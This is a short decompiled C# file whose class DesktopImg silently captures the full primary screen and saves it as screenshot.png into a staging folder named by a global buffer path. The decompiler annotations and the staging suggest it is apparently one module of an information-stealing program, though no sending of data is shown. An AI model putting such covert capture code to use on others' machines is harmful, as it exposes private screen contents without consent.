using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

// Token: 0x0200000D RID: 13
internal class DesktopImg
{
	// Token: 0x0600001F RID: 31 RVA: 0x00003D84 File Offset: 0x00001F84
	public static void Start()
	{
		string text = string.Format("{0}screenshot.png", global::Buffer.path_l);
		try
		{
			Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
			Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
			bitmap.Save(text, ImageFormat.Png);
		}
		catch
		{
			File.WriteAllText(text, "");
		}
	}
}
